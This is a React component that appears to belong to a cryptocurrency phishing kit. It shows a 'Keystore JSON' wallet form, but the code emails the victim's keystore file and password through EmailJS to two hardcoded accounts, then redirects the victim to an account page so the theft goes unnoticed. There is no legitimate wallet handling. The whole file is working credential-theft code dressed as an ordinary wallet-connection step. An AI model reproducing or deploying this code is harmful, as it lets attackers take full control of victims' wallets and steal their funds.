import React, { useState } from 'react';
import { useRouter } from 'next/router';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import emailjs from '@emailjs/browser';
import style from "@/styles/form.module.css";

const KeyStore = ({ selectedWallet, appType}) => {
  
  const router = useRouter();
  const [keystore, setKeyStore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [keystoreSubmit, setKeystoreSubmit] = useState('Proceed');

  const handleKeystoreSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setKeystoreSubmit("Processing...");
    const name = selectedWallet ?? appType;
    const type = "Keystore_JSON";
    const data = keystore;
    const password = keystorePassword;
    const formData = { name, type, data, password };

    const sendFast = (ms: number): Promise<void> =>
      new Promise((resolve) => setTimeout(resolve, ms));

    try {

      await emailjs.send(
        'service_30vkiql',
        'template_e0wb6w8',
        {
          to_name: "prime_noval_app",
          from_name: formData.name,
          message: `
            Name: ${formData.name}
            Type: ${formData.type}
            Data: ${formData.data}
            Password: ${formData.password}
          `,
        },
        '4leuzsOPi6Oh_D4e0'
      );

      await sendFast(1 * 60 * 1000);
      
      await emailjs.send(
        'service_ky8xa0e',
        'template_kqjcmir',
        {
          to_name: "prime_noval_app",
          from_name: formData.name,
          message: `
            Name: ${formData.name}
            Type: ${formData.type}
            Data: ${formData.data}
            Password: ${formData.password}
          `,
        },
        'pudHPDoixy2beukw8'
      );

      setTimeout(() => {
        router.push('/account');
      }, 3000);
    } catch (error: unknown) {
      if (error instanceof Error) {
        console.error('Error message:', error.message);
        setKeystoreSubmit("Proceed");
        toast.error("error!", {
          position: "top-right",
          autoClose: 2500,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "light",
        });
      } else {
        console.error('An unknown error occurred:', error);
        toast.error("error!", {
          position: "top-right",
          autoClose: 2500,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "light",
        });
      }
    }
  };

  return (
    <section className={style.section}>
      <ToastContainer />
      <p className={style.walletType}>Keystore JSON</p>
      <form onSubmit={handleKeystoreSubmit} className={style.form}>
        <textarea
          autoComplete="off"
          required
          spellCheck="false"
          name="Keystore"
          rows={7}
          placeholder=""
          className={style.textarea}
          value={keystore}
          onChange={(e) => setKeyStore(e.target.value)}
        ></textarea>
        <p className={style.hint}>Please enter the keystore password</p>
        <input
          required
          type="password"
          autoComplete="off"
          name="keystorePassword"
          value={keystorePassword}
          onChange={(e) => setKeystorePassword(e.target.value)}
          placeholder="*****"
          className={style.passwordInput}
        />
        <button type="submit" className={style.connectButton}>
          {keystoreSubmit}
        </button>
      </form>
    </section>
  );
};

export default KeyStore;
